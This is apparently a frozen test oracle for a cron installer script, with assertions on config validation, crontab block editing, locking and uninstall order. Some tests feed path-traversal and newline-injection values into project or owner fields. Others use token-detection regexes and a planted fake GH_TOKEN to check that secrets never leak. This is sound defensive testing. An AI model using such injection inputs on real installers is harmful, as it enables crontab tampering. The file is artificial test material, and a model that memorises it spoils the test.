/**
 * @description FROZEN oracle for core/vps/install-crons.mjs (VPS cron installer). One test()
 * per numbered assertion in .claude/plans/vps-install-crons/execution-plan.md — the ORIGINAL 31
 * (a1-a31) plus Revision 1's added/strengthened assertions (a32-a49), transcribed verbatim.
 * Mirrors the run-crons.test.mjs idiom: node:test + node:assert/strict, deps-injection with
 * in-memory fakes, ZERO real git/gh/fs/crontab mutation. Pure transforms (validate/generate/
 * render/upsert/remove/list/reconcile) are exercised directly with plain strings/objects; the
 * composition roots (installProject/uninstallProject) receive every side-effecting seam through
 * a flat `deps` object (see makeMemoryDeps below for the exact contract).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { join, dirname } from "node:path";

import {
  validateInstallCoordinates,
  generateProjectConfig,
  renderProjectBlock,
  renderReaperBlock,
  upsertBlock,
  removeBlock,
  listRegisteredProjects,
  reconcileFleet,
  removeFromFleetConfig,
  readConfigFile,
  readCrontab,
  writeCrontab,
  atomicWriteConfig,
  withInstallLock,
  installProject,
  uninstallProject,
  runCli,
} from "./install-crons.mjs";
import { loadConfig, REQUIRED_CONFIG_FIELDS } from "./run-cron-a.mjs";

const BASE_COORDS = {
  project: "demo",
  owner: "acme",
  repo: "demo-repo",
  projectRoot: "/srv/demo",
  stateDir: "/srv/demo/.claude/state",
  worktreeRoot: "/srv/worktrees",
  homeDir: "/home/harness",
};

const NODE_BIN = "/usr/bin/node";
const SCRIPT_DIR = "/srv/harness/core/vps";

/** @description Absolute per-project config path — mirrors the plan's own join() formula. */
function configPathFor(project, homeDir = BASE_COORDS.homeDir) {
  return join(homeDir, ".claude/harness-crons", `${project}.json`);
}

/** @description Absolute reaper fleet config path — mirrors the plan's own join() formula. */
function fleetPathFor(homeDir = BASE_COORDS.homeDir) {
  return join(homeDir, ".claude/harness-crons/reaper.json");
}

/** @description Absolute install-lock path — mirrors the plan's own join() formula. */
function lockPathFor(homeDir = BASE_COORDS.homeDir) {
  return join(homeDir, ".claude/harness-crons/.install.lock");
}

/** @description Renders a project's fenced crontab block using the shared fixture constants. */
function projectBlockFixture(project, homeDir = BASE_COORDS.homeDir) {
  return renderProjectBlock({
    project,
    nodeBin: NODE_BIN,
    scriptDir: SCRIPT_DIR,
    configPath: configPathFor(project, homeDir),
  });
}

/** @description Renders the shared reaper's fenced crontab block using the fixture constants. */
function reaperBlockFixture(homeDir = BASE_COORDS.homeDir) {
  return renderReaperBlock({
    nodeBin: NODE_BIN,
    scriptDir: SCRIPT_DIR,
    reaperConfigPath: fleetPathFor(homeDir),
  });
}

/**
 * @description Builds a fully in-memory fake `deps` object for installProject/uninstallProject.
 * Deps contract (the implementer must conform to these keys):
 *   - readCrontab(): string                    — replaces the whole real crontab-read seam
 *   - writeCrontab(text): void                 — replaces the whole real crontab-write seam
 *   - readConfigFile(path): object|null         — replaces the whole real config-read seam
 *   - writeConfig(path, obj): void              — replaces the whole real atomic config-write seam
 *   - mkdirSync(path, opts): void               — lock directory creation
 *   - openSync(path): fd                        — lock acquire (throws {code:"EEXIST"} if held)
 *   - closeSync(fd): void                       — lock fd close
 *   - unlinkSync(path): void                    — lock release (the .install.lock file ONLY)
 *   - rmSync(path, opts): void                  — per-project config removal on uninstall (force)
 *   - nodeBin: string, scriptDir: string        — baked into rendered crontab lines
 *   - homeDir: string                           — path root (uninstallProject has no coords)
 *   - env: object                               — process.env override (secret-hygiene probes)
 *   - log(line): void                           — captures product-language log lines
 */
function makeMemoryDeps(overrides = {}) {
  const state = {
    crontabText: overrides.initialCrontab ?? "",
    configs: new Map(overrides.initialConfigs ? Object.entries(overrides.initialConfigs) : []),
    locks: new Set(),
    writeConfigCalls: [],
    writeCrontabCalls: [],
    unlinkSyncCalls: [],
    rmSyncCalls: [],
    mkdirCalls: [],
    logLines: [],
  };

  const deps = {
    homeDir: overrides.homeDir ?? BASE_COORDS.homeDir,
    env: overrides.env ?? process.env,
    readCrontab: () => state.crontabText,
    writeCrontab: (text) => {
      state.writeCrontabCalls.push(text);
      state.crontabText = text;
    },
    readConfigFile: (path) => (state.configs.has(path) ? state.configs.get(path) : null),
    writeConfig: (path, obj) => {
      state.writeConfigCalls.push({ path, obj });
      state.configs.set(path, obj);
    },
    mkdirSync: (path, opts) => {
      state.mkdirCalls.push({ path, opts });
    },
    openSync: (path) => {
      if (state.locks.has(path)) {
        const err = new Error("lock already held");
        err.code = "EEXIST";
        throw err;
      }
      state.locks.add(path);
      return 1;
    },
    closeSync: () => {},
    unlinkSync: (path) => {
      state.unlinkSyncCalls.push(path);
      state.locks.delete(path);
    },
    rmSync: (path) => {
      state.rmSyncCalls.push(path);
      state.configs.delete(path);
    },
    nodeBin: NODE_BIN,
    scriptDir: SCRIPT_DIR,
    log: (line) => state.logLines.push(line),
  };

  return { deps, state };
}

// ---------------------------------------------------------------------------------------------
// Config generation & validation (#ac-1.x)
// ---------------------------------------------------------------------------------------------

test("[#ac-1.1] a1: validateInstallCoordinates: valid coords return a known-field object without throwing", () => {
  const result = validateInstallCoordinates(BASE_COORDS);
  assert.equal(result.project, BASE_COORDS.project);
  assert.equal(result.owner, BASE_COORDS.owner);
  assert.equal(result.repo, BASE_COORDS.repo);
  assert.equal(result.projectRoot, BASE_COORDS.projectRoot);
  assert.equal(result.stateDir, BASE_COORDS.stateDir);
  assert.equal(result.worktreeRoot, BASE_COORDS.worktreeRoot);
  assert.equal(result.homeDir, BASE_COORDS.homeDir);
});

test("[#ac-1.2] a2: validateInstallCoordinates: project \"reaper\" is reserved and throws naming the field", () => {
  assert.throws(() => validateInstallCoordinates({ ...BASE_COORDS, project: "reaper" }), /project/i);
});

test("[#ac-1.2] a3: validateInstallCoordinates: a control character in project throws and is never echoed raw", () => {
  assert.throws(
    () => validateInstallCoordinates({ ...BASE_COORDS, project: "a\nb" }),
    (err) => {
      assert.match(err.message, /project/i);
      assert.equal(err.message.includes("\n"), false, "must never echo a raw control character");
      return true;
    }
  );
});

test("[#ac-1.2] a4: validateInstallCoordinates: non-slug project values throw", () => {
  for (const bad of ["../etc", "a/b", "UPPER"]) {
    assert.throws(
      () => validateInstallCoordinates({ ...BASE_COORDS, project: bad }),
      /project/i,
      `project=${bad}`
    );
  }
});

test("[#ac-1.2/#ac-1.1] a5: validateInstallCoordinates: control chars in owner/repo throw naming the field and never echo the raw character", () => {
  assert.throws(
    () => validateInstallCoordinates({ ...BASE_COORDS, owner: "a\rb" }),
    (err) => {
      assert.match(err.message, /owner/i);
      assert.equal(err.message.includes("\r"), false);
      return true;
    }
  );
  assert.throws(
    () => validateInstallCoordinates({ ...BASE_COORDS, repo: "demo\nrepo" }),
    (err) => {
      assert.match(err.message, /repo/i);
      assert.equal(err.message.includes("\n"), false);
      return true;
    }
  );
});

test("[#ac-1.2] a6: validateInstallCoordinates: a relative projectRoot throws (must be absolute)", () => {
  assert.throws(() => validateInstallCoordinates({ ...BASE_COORDS, projectRoot: "relative/x" }), /projectRoot/i);
});

test("[#ac-1.2/#ac-1.1] a7: validateInstallCoordinates is a stricter superset of loadConfig: an owner with a space passes loadConfig's presence check but throws here", () => {
  const coordsWithSpace = { ...BASE_COORDS, owner: "a b" };
  assert.doesNotThrow(() => loadConfig(coordsWithSpace));
  assert.throws(() => validateInstallCoordinates(coordsWithSpace), /owner/i);
});

test("[#ac-1.1/#ac-1.5] a8: generateProjectConfig produces exactly REQUIRED_CONFIG_FIELDS (+author when present) and round-trips through loadConfig", () => {
  const coords = validateInstallCoordinates(BASE_COORDS);
  const config = generateProjectConfig(coords);
  assert.deepEqual([...Object.keys(config)].sort(), [...REQUIRED_CONFIG_FIELDS].sort());

  const normalized = loadConfig(config);
  for (const field of REQUIRED_CONFIG_FIELDS) {
    assert.equal(normalized[field], config[field]);
  }

  const coordsWithAuthor = { ...BASE_COORDS, harnessAuthorLogin: "bot-user" };
  const configWithAuthor = generateProjectConfig(validateInstallCoordinates(coordsWithAuthor));
  assert.deepEqual(
    [...Object.keys(configWithAuthor)].sort(),
    [...REQUIRED_CONFIG_FIELDS, "harnessAuthorLogin"].sort()
  );
  assert.equal(configWithAuthor.harnessAuthorLogin, "bot-user");
});

test("[#ac-1.4] a9: reconcileFleet: an existing fleet's owner/repo differs from incoming coords, throws, and never mutates the input fleet", () => {
  const existingFleet = {
    project: "other",
    owner: "acme",
    repo: "x",
    projectRoot: "/srv/other",
    stateDir: "/srv/other/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [{ project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" }],
  };
  const snapshot = JSON.parse(JSON.stringify(existingFleet));
  const coords = { ...BASE_COORDS, owner: "beta", repo: "y" };

  assert.throws(() => reconcileFleet(existingFleet, ["other"], coords));
  assert.deepEqual(existingFleet, snapshot, "reconcileFleet must never mutate its input fleet");
});

test("[#ac-1.3] a10: reconcileFleet: a null existing fleet seeds a fresh fleet whose projects[] entries carry no owner/repo", () => {
  const fleet = reconcileFleet(null, [], BASE_COORDS);
  assert.equal(fleet.owner, BASE_COORDS.owner);
  assert.equal(fleet.repo, BASE_COORDS.repo);
  assert.deepEqual(fleet.projects, [
    { project: BASE_COORDS.project, projectRoot: BASE_COORDS.projectRoot, stateDir: BASE_COORDS.stateDir },
  ]);
  for (const entry of fleet.projects) {
    assert.equal("owner" in entry, false);
    assert.equal("repo" in entry, false);
  }
});

test("[#ac-1.3/#ac-1.4] a11: reconcileFleet: re-installing an already-registered project upserts in place (no duplicate) and leaves top owner/repo unchanged", () => {
  const existingFleet = {
    project: "demo",
    owner: "acme",
    repo: "demo-repo",
    projectRoot: "/srv/demo-old",
    stateDir: "/srv/demo-old/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [{ project: "demo", projectRoot: "/srv/demo-old", stateDir: "/srv/demo-old/.claude/state" }],
  };
  const coords = { ...BASE_COORDS, projectRoot: "/srv/demo-new", stateDir: "/srv/demo-new/.claude/state" };

  const fleet = reconcileFleet(existingFleet, ["demo"], coords);
  assert.equal(fleet.projects.length, 1);
  assert.deepEqual(fleet.projects[0], {
    project: "demo",
    projectRoot: "/srv/demo-new",
    stateDir: "/srv/demo-new/.claude/state",
  });
  assert.equal(fleet.owner, "acme");
  assert.equal(fleet.repo, "demo-repo");
});

// ---------------------------------------------------------------------------------------------
// Crontab registration (#ac-2.x)
// ---------------------------------------------------------------------------------------------

test("[#ac-2.1/#ac-2.3] a12: renderProjectBlock: fixed cadences, absolute paths, literal fence markers", () => {
  const block = projectBlockFixture("demo");
  const lines = block.split("\n");
  assert.equal(lines[0], "# >>> harness:demo >>>");
  assert.equal(lines[lines.length - 1], "# <<< harness:demo <<<");
  assert.ok(
    lines.some(
      (l) => l.startsWith("0 */4 * * * ") && l.includes(NODE_BIN) && l.includes("run-cron-a.mjs") && l.includes(configPathFor("demo"))
    )
  );
  assert.ok(
    lines.some(
      (l) => l.startsWith("0 */6 * * * ") && l.includes(NODE_BIN) && l.includes("run-cron-review.mjs") && l.includes(configPathFor("demo"))
    )
  );
});

test("[#ac-2.2/#ac-2.3] a13: renderReaperBlock: a single fixed-cadence run-reaper line inside the harness:reaper fence", () => {
  const block = reaperBlockFixture();
  const lines = block.split("\n");
  assert.equal(lines[0], "# >>> harness:reaper >>>");
  assert.equal(lines[lines.length - 1], "# <<< harness:reaper <<<");
  const bodyLines = lines.slice(1, -1);
  assert.equal(bodyLines.length, 1);
  assert.ok(bodyLines[0].startsWith("0 3 * * * "));
  assert.ok(bodyLines[0].includes("run-reaper.mjs"));
  assert.ok(bodyLines[0].includes(fleetPathFor()));
});

test("[#ac-2.4] a14: upsertBlock applied twice with the same marker/block yields exactly one fenced block", () => {
  const block = projectBlockFixture("demo");
  let text = upsertBlock("", "harness:demo", block);
  text = upsertBlock(text, "harness:demo", block);
  const openers = text.split("\n").filter((l) => l === "# >>> harness:demo >>>");
  assert.equal(openers.length, 1);
});

test("[#ac-2.4/#ac-2.2] a15: installProject run twice via fakes leaves exactly one project block and one reaper block in the final crontab", () => {
  const { deps, state } = makeMemoryDeps();
  installProject({ ...BASE_COORDS }, deps);
  installProject({ ...BASE_COORDS }, deps);

  const openProject = state.crontabText.split("\n").filter((l) => l === "# >>> harness:demo >>>");
  const openReaper = state.crontabText.split("\n").filter((l) => l === "# >>> harness:reaper >>>");
  assert.equal(openProject.length, 1);
  assert.equal(openReaper.length, 1);
});

test("[#ac-4.1/#ac-4.2] a16: installProject: no token-shaped substring ever appears in the crontab, fleet config, per-project config, or logs", () => {
  const { deps, state } = makeMemoryDeps();
  installProject({ ...BASE_COORDS, harnessAuthorLogin: "harness-bot" }, deps);

  const haystack = [
    state.crontabText,
    ...state.writeConfigCalls.map((c) => JSON.stringify(c.obj)),
    ...state.logLines,
  ].join("\n");

  assert.doesNotMatch(haystack, /gh[pousr]_/);
  assert.doesNotMatch(haystack, /ghp_/);
  assert.doesNotMatch(haystack, /OLLAMA/);
  assert.doesNotMatch(haystack, /TOKEN/);
});

test("[#ac-2.5] a17: installProject: nodeBin defaults to process.execPath (absolute) when deps.nodeBin is omitted", () => {
  const { deps, state } = makeMemoryDeps();
  delete deps.nodeBin;

  installProject({ ...BASE_COORDS }, deps);

  const cronLines = state.crontabText
    .split("\n")
    .filter((l) => l.includes("run-cron-a.mjs") || l.includes("run-cron-b.mjs"));
  assert.ok(cronLines.length > 0);
  for (const line of cronLines) {
    assert.ok(line.includes(process.execPath));
  }
});

test("[#ac-5.5] a18: installProject writes in order: per-project config, then fleet config, then crontab", () => {
  const { deps } = makeMemoryDeps();
  const order = [];
  const origWriteConfig = deps.writeConfig;
  const origWriteCrontab = deps.writeCrontab;
  deps.writeConfig = (path, obj) => {
    order.push({ kind: "config", path });
    origWriteConfig(path, obj);
  };
  deps.writeCrontab = (text) => {
    order.push({ kind: "crontab" });
    origWriteCrontab(text);
  };

  installProject({ ...BASE_COORDS }, deps);

  assert.equal(order.length, 3);
  assert.equal(order[0].kind, "config");
  assert.ok(order[0].path.endsWith(`${BASE_COORDS.project}.json`));
  assert.equal(order[1].kind, "config");
  assert.ok(order[1].path.endsWith("reaper.json"));
  assert.equal(order[2].kind, "crontab");
});

// ---------------------------------------------------------------------------------------------
// Hardened crontab read (#ac-5.1) & uninstall (#ac-3.x)
// ---------------------------------------------------------------------------------------------

test("[#ac-5.1] a19: readCrontab: exit status 1 with a \"no crontab for\" stderr is treated as an empty crontab, not a throw", () => {
  const fakeSpawnSync = () => ({ status: 1, stdout: "", stderr: "no crontab for harness\n" });
  const result = readCrontab({ spawnSync: fakeSpawnSync });
  assert.equal(result, "");
});

test("[#ac-5.1] a20: readCrontab permission-denied throws; installProject aborts pre-write", () => {
  const fakeSpawnSync = () => ({ status: 1, stdout: "", stderr: "permission denied\n" });
  assert.throws(() => readCrontab({ spawnSync: fakeSpawnSync }));

  const { deps, state } = makeMemoryDeps();
  deps.readCrontab = () => {
    throw new Error("crontab -l: permission denied");
  };

  assert.throws(() => installProject({ ...BASE_COORDS }, deps));
  assert.equal(state.writeConfigCalls.length, 0);
  assert.equal(state.writeCrontabCalls.length, 0);
});

test("[#ac-3.1/#ac-5.2] a21: removeBlock: removing the demo block leaves another project's block and an unrelated cron line byte-identical", () => {
  const otherBlock = projectBlockFixture("other");
  const backupLine = "*/5 * * * * backup.sh";
  const crontabText = `${otherBlock}\n${backupLine}\n${projectBlockFixture("demo")}\n`;

  const result = removeBlock(crontabText, "harness:demo");

  assert.ok(result.includes(otherBlock));
  assert.ok(result.includes(backupLine));
  assert.equal(result.includes("# >>> harness:demo >>>"), false);
});

test("[#ac-3.2] a22: uninstallProject: with another project still registered, the reaper block is retained", () => {
  const initialCrontab = `${projectBlockFixture("demo")}\n${projectBlockFixture("other")}\n${reaperBlockFixture()}\n`;
  const { deps, state } = makeMemoryDeps({ initialCrontab });

  uninstallProject("demo", deps);

  assert.equal(state.crontabText.includes("# >>> harness:demo >>>"), false);
  assert.ok(state.crontabText.includes("# >>> harness:other >>>"));
  assert.ok(state.crontabText.includes("# >>> harness:reaper >>>"));
});

test("[#ac-3.2] a23: uninstallProject: the last remaining project also removes the reaper block, and the per-project config is removed", () => {
  const initialCrontab = `${projectBlockFixture("demo")}\n${reaperBlockFixture()}\n`;
  const { deps, state } = makeMemoryDeps({ initialCrontab });

  uninstallProject("demo", deps);

  assert.equal(listRegisteredProjects(state.crontabText).length, 0);
  assert.equal(state.crontabText.includes("# >>> harness:reaper >>>"), false);
  assert.ok(state.rmSyncCalls.some((p) => p.endsWith("demo.json")));
});

test("[#ac-3.3] a24: uninstallProject: uninstalling an unregistered project is a safe no-op", () => {
  const initialCrontab = `${projectBlockFixture("demo")}\n`;
  const { deps, state } = makeMemoryDeps({ initialCrontab });

  assert.doesNotThrow(() => uninstallProject("ghost", deps));
  assert.equal(state.crontabText, initialCrontab);
  assert.equal(state.rmSyncCalls.length, 0);
});

test("[#ac-5.5/#ac-3.2] a25: last-project uninstall writes in order: crontab, then fleet-FILE removal (delete, not rewrite), then per-project config removal", () => {
  const initialCrontab = `${projectBlockFixture("demo")}\n${reaperBlockFixture()}\n`;
  const initialConfigs = {
    [fleetPathFor()]: {
      project: "demo",
      owner: "acme",
      repo: "demo-repo",
      projectRoot: "/srv/demo",
      stateDir: "/srv/demo/.claude/state",
      worktreeRoot: "/srv/worktrees",
      homeDir: "/home/harness",
      projects: [{ project: "demo", projectRoot: "/srv/demo", stateDir: "/srv/demo/.claude/state" }],
    },
  };
  const { deps, state } = makeMemoryDeps({ initialCrontab, initialConfigs });

  const order = [];
  const origWriteCrontab = deps.writeCrontab;
  const origWriteConfig = deps.writeConfig;
  const origRmSync = deps.rmSync;
  deps.writeCrontab = (text) => {
    order.push({ op: "crontab" });
    origWriteCrontab(text);
  };
  deps.writeConfig = (path, obj) => {
    order.push({ op: "writeConfig", path });
    origWriteConfig(path, obj);
  };
  deps.rmSync = (path, opts) => {
    order.push({ op: "rm", path });
    origRmSync(path, opts);
  };

  uninstallProject("demo", deps);

  // #ac-3.2: on the LAST project the fleet file is DELETED, never rewritten to an empty fleet.
  assert.equal(state.writeConfigCalls.length, 0, "fleet must not be writeConfig'd on last-out");
  assert.equal(order.length, 3);
  assert.deepEqual(order[0], { op: "crontab" });
  assert.equal(order[1].op, "rm");
  assert.equal(order[1].path, fleetPathFor(), "fleet PATH is rm'd, not writeConfig'd");
  assert.equal(order[2].op, "rm");
  assert.ok(order[2].path.endsWith("demo.json"));
});

test("[#ac-5.3] a26: removeBlock: literal marker match never over-matches a similarly-prefixed project name", () => {
  const demo2Block = projectBlockFixture("demo-2");
  const crontabText = `${projectBlockFixture("demo")}\n${demo2Block}\n`;

  const result = removeBlock(crontabText, "harness:demo");

  assert.equal(result.includes("# >>> harness:demo >>>"), false);
  assert.equal(result.includes("# >>> harness:demo-2 >>>"), true);
  assert.equal(result, `${demo2Block}\n`);
});

// ---------------------------------------------------------------------------------------------
// Atomic writes & the install lock (#ac-1.5 / #ac-5.6)
// ---------------------------------------------------------------------------------------------

test("[#ac-1.5] a27: atomicWriteConfig: writes to a tmp file then renames (never truncates the final path directly); a write failure removes the tmp file and rethrows", () => {
  const calls = [];
  const happyDeps = {
    mkdirSync: (p, opts) => calls.push({ op: "mkdir", p, opts }),
    writeFileSync: (p, content) => calls.push({ op: "write", p, content }),
    renameSync: (from, to) => calls.push({ op: "rename", from, to }),
    rmSync: (p, opts) => calls.push({ op: "rm", p, opts }),
  };
  const finalPath = "/home/harness/.claude/harness-crons/demo.json";

  atomicWriteConfig(finalPath, { a: 1 }, happyDeps);

  const writeCall = calls.find((c) => c.op === "write");
  const renameCall = calls.find((c) => c.op === "rename");
  assert.ok(writeCall, "must write to a path first");
  assert.notEqual(writeCall.p, finalPath, "must never write the final path directly");
  assert.ok(renameCall);
  assert.equal(renameCall.from, writeCall.p);
  assert.equal(renameCall.to, finalPath);

  const failCalls = [];
  const failingDeps = {
    mkdirSync: () => {},
    writeFileSync: (p) => {
      failCalls.push({ op: "write", p });
      throw new Error("disk full");
    },
    renameSync: () => {
      failCalls.push({ op: "rename" });
    },
    rmSync: (p) => failCalls.push({ op: "rm", p }),
  };

  assert.throws(() => atomicWriteConfig(finalPath, { a: 1 }, failingDeps), /disk full/);
  assert.equal(failCalls.some((c) => c.op === "rename"), false, "must never rename after a failed write");
  const rmCall = failCalls.find((c) => c.op === "rm");
  assert.ok(rmCall, "must remove the tmp file on write failure");
  assert.equal(rmCall.p, failCalls.find((c) => c.op === "write").p);
});

test("[#ac-1.5/#ac-5.4] a28: a malformed existing fleet entry (missing required per-project fields) fails the projects-shape gate before any write, including the crontab", () => {
  const existingFleet = {
    project: "other",
    owner: "acme",
    repo: "demo-repo",
    projectRoot: "/srv/other",
    stateDir: "/srv/other/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [{ project: "other" }], // malformed: missing projectRoot/stateDir
  };
  const initialCrontab = `${projectBlockFixture("other")}\n`; // "other" is registered in the crontab
  const initialConfigs = { [fleetPathFor()]: existingFleet };
  const { deps, state } = makeMemoryDeps({ initialCrontab, initialConfigs });

  assert.throws(() => installProject({ ...BASE_COORDS }, deps));
  assert.equal(state.writeConfigCalls.length, 0);
  assert.equal(state.writeCrontabCalls.length, 0);
});

test("[#ac-5.6] a29: withInstallLock: a pre-held lock makes installProject throw \"install already in progress\" without mutating anything", () => {
  const { deps, state } = makeMemoryDeps();
  state.locks.add(lockPathFor());

  assert.throws(() => installProject({ ...BASE_COORDS }, deps), /install already in progress/);
  assert.equal(state.writeConfigCalls.length, 0);
  assert.equal(state.writeCrontabCalls.length, 0);
});

test("[#ac-5.6] a30: withInstallLock: the lock is released in a finally even when the wrapped function throws", () => {
  const calls = [];
  const deps = {
    mkdirSync: (p) => calls.push({ op: "mkdir", p }),
    openSync: (p) => {
      calls.push({ op: "open", p });
      return 3;
    },
    closeSync: (fd) => calls.push({ op: "close", fd }),
    unlinkSync: (p) => calls.push({ op: "unlink", p }),
  };

  let ran = false;
  assert.throws(
    () =>
      withInstallLock(
        "/home/harness",
        () => {
          ran = true;
          throw new Error("boom");
        },
        deps
      ),
    /boom/
  );

  assert.equal(ran, true);
  assert.ok(calls.some((c) => c.op === "unlink"));
  assert.ok(calls.some((c) => c.op === "close"));
});

test("[#ac-1.4/#ac-3.2] a31: listRegisteredProjects: returns every registered project name and excludes the reaper marker", () => {
  const crontabText = `${projectBlockFixture("demo")}\n${projectBlockFixture("other")}\n${reaperBlockFixture()}\n`;
  const projects = listRegisteredProjects(crontabText);
  assert.deepEqual([...projects].sort(), ["demo", "other"]);
});

// ---------------------------------------------------------------------------------------------
// Revision 1 — added/strengthened frozen assertions (a32-a49)
// ---------------------------------------------------------------------------------------------

test("[#ac-5.6] a32: withInstallLock: mkdirSync(dirname(lock)) runs before openSync (first-ever install has no dir yet)", () => {
  const order = [];
  const deps = {
    mkdirSync: (p) => order.push({ op: "mkdir", p }),
    openSync: (p) => {
      order.push({ op: "open", p });
      return 3;
    },
    closeSync: () => {},
    unlinkSync: () => {},
  };
  withInstallLock("/home/harness", () => {}, deps);
  assert.equal(order[0].op, "mkdir");
  assert.equal(order[1].op, "open");
});

test("[#ac-5.6] a33: withInstallLock: EEXIST on openSync throws \"install already in progress\" and does NOT unlink (it is another installer's lock)", () => {
  const unlinkCalls = [];
  const deps = {
    mkdirSync: () => {},
    openSync: () => {
      const err = new Error("lock held");
      err.code = "EEXIST";
      throw err;
    },
    closeSync: () => {},
    unlinkSync: (p) => unlinkCalls.push(p),
  };
  assert.throws(() => withInstallLock("/home/harness", () => {}, deps), /install already in progress/);
  assert.equal(unlinkCalls.length, 0);
});

test("[#ac-5.6] a34: withInstallLock: the wrapped function's original error propagates unmasked, and the lock this call created is still unlinked", () => {
  const unlinkCalls = [];
  const deps = {
    mkdirSync: () => {},
    openSync: () => 3,
    closeSync: () => {},
    unlinkSync: (p) => unlinkCalls.push(p),
  };
  assert.throws(
    () =>
      withInstallLock(
        "/home/harness",
        () => {
          throw new Error("original failure");
        },
        deps
      ),
    /original failure/
  );
  assert.equal(unlinkCalls.length, 1);
});

test("[#ac-2.4/#ac-5.2] a35: upsertBlock: inserting into an empty crontab yields exactly the block plus one trailing newline, no leading blank", () => {
  const block = projectBlockFixture("demo");
  const result = upsertBlock("", "harness:demo", block);
  assert.equal(result, `${block}\n`);
});

test("[#ac-5.2] a36: upsertBlock: a base ending without a newline gets a separating newline before the appended block (no glue)", () => {
  const block = projectBlockFixture("demo");
  const result = upsertBlock("backup.sh", "harness:demo", block);
  assert.equal(result.includes("backup.sh# >>>"), false);
  assert.equal(result, `backup.sh\n${block}\n`);
});

test("[#ac-5.2/#ac-3.1] a37: removeBlock: removing a block sandwiched between two unrelated lines joins them with exactly one newline (no glue, no blank line)", () => {
  const block = projectBlockFixture("demo");
  const crontabText = `*/1 * * * * before.sh\n${block}\n*/2 * * * * after.sh\n`;
  const result = removeBlock(crontabText, "harness:demo");
  assert.equal(result, "*/1 * * * * before.sh\n*/2 * * * * after.sh\n");
});

test("[#ac-2.4/#ac-3.1] a38: round-trip: removeBlock(upsertBlock(orig, marker, block), marker) restores the original (newline-normalized)", () => {
  const block = projectBlockFixture("demo");
  const orig = "*/5 * * * * backup.sh\n";
  const roundTripped = removeBlock(upsertBlock(orig, "harness:demo", block), "harness:demo");
  assert.equal(roundTripped, orig);
});

test("[#ac-5.2] a39: writeCrontab: the text piped to the real crontab process ends in exactly one trailing newline", () => {
  const spawnSyncCalls = [];
  const fakeSpawnSync = (cmd, args, opts) => {
    spawnSyncCalls.push({ cmd, args, opts });
    return { status: 0, stdout: "", stderr: "" };
  };

  writeCrontab("*/5 * * * * backup.sh", { spawnSync: fakeSpawnSync });

  assert.equal(spawnSyncCalls.length, 1);
  const pipedInput = spawnSyncCalls[0].opts.input;
  assert.equal(pipedInput, "*/5 * * * * backup.sh\n");
  assert.equal(/\n\n$/.test(pipedInput), false);
});

test("[#ac-1.4] a40: installProject: same owner but a different repo than the existing fleet throws and mutates nothing", () => {
  const existingFleet = {
    project: "other",
    owner: "acme",
    repo: "x",
    projectRoot: "/srv/other",
    stateDir: "/srv/other/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [{ project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" }],
  };
  const initialConfigs = { [fleetPathFor()]: existingFleet };
  const { deps, state } = makeMemoryDeps({ initialConfigs });

  assert.throws(() => installProject({ ...BASE_COORDS, owner: "acme", repo: "y" }, deps));
  assert.equal(state.writeConfigCalls.length, 0);
  assert.equal(state.writeCrontabCalls.length, 0);
  assert.equal(state.rmSyncCalls.length, 0);
});

test("[#ac-1.4] a41: installProject: a wholly different owner/repo than the existing fleet mutates nothing", () => {
  const existingFleet = {
    project: "other",
    owner: "acme",
    repo: "x",
    projectRoot: "/srv/other",
    stateDir: "/srv/other/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [{ project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" }],
  };
  const initialConfigs = { [fleetPathFor()]: existingFleet };
  const { deps, state } = makeMemoryDeps({ initialConfigs });

  assert.throws(() => installProject({ ...BASE_COORDS, owner: "beta", repo: "y" }, deps));
  assert.equal(state.writeConfigCalls.length, 0);
  assert.equal(state.writeCrontabCalls.length, 0);
  assert.equal(state.rmSyncCalls.length, 0);
});

test("[#ac-1.3/#ac-5.5] a42: installProject: a fleet entry with no matching crontab block (a ghost) is dropped on reconciliation", () => {
  const existingFleet = {
    project: "ghost",
    owner: "acme",
    repo: "demo-repo",
    projectRoot: "/srv/ghost",
    stateDir: "/srv/ghost/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [{ project: "ghost", projectRoot: "/srv/ghost", stateDir: "/srv/ghost/.claude/state" }],
  };
  const initialConfigs = { [fleetPathFor()]: existingFleet };
  const { deps, state } = makeMemoryDeps({ initialConfigs, initialCrontab: "" });

  installProject({ ...BASE_COORDS }, deps);

  const fleetWrite = state.writeConfigCalls.find((c) => c.path.endsWith("reaper.json"));
  assert.ok(fleetWrite);
  assert.equal(fleetWrite.obj.projects.some((p) => p.project === "ghost"), false);
  assert.ok(fleetWrite.obj.projects.some((p) => p.project === "demo"));
});

test("[#ac-1.3] a43: installProject: an empty (\"no crontab for\") crontab reconciles the fleet down to just the project being installed", () => {
  const existingFleet = {
    project: "ghost",
    owner: "acme",
    repo: "demo-repo",
    projectRoot: "/srv/ghost",
    stateDir: "/srv/ghost/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [{ project: "ghost", projectRoot: "/srv/ghost", stateDir: "/srv/ghost/.claude/state" }],
  };
  const initialConfigs = { [fleetPathFor()]: existingFleet };
  const { deps, state } = makeMemoryDeps({ initialConfigs, initialCrontab: "" });

  installProject({ ...BASE_COORDS }, deps);

  const fleetWrite = state.writeConfigCalls.find((c) => c.path.endsWith("reaper.json"));
  assert.deepEqual(fleetWrite.obj.projects, [
    { project: "demo", projectRoot: "/srv/demo", stateDir: "/srv/demo/.claude/state" },
  ]);
});

test("[#ac-4.1] a44: installProject: a real GH_TOKEN in the environment and a poisoned .dev.vars read never leak into any config, crontab, or log line", () => {
  const secret = "ghp_secret";
  const { deps, state } = makeMemoryDeps({ env: { ...process.env, GH_TOKEN: secret } });
  const devVarsPath = join(BASE_COORDS.projectRoot, ".dev.vars");
  const originalReadConfigFile = deps.readConfigFile;
  deps.readConfigFile = (path) => {
    if (path === devVarsPath) return { GH_TOKEN: secret }; // poisoned seam the installer must never touch
    return originalReadConfigFile(path);
  };

  installProject({ ...BASE_COORDS }, deps);

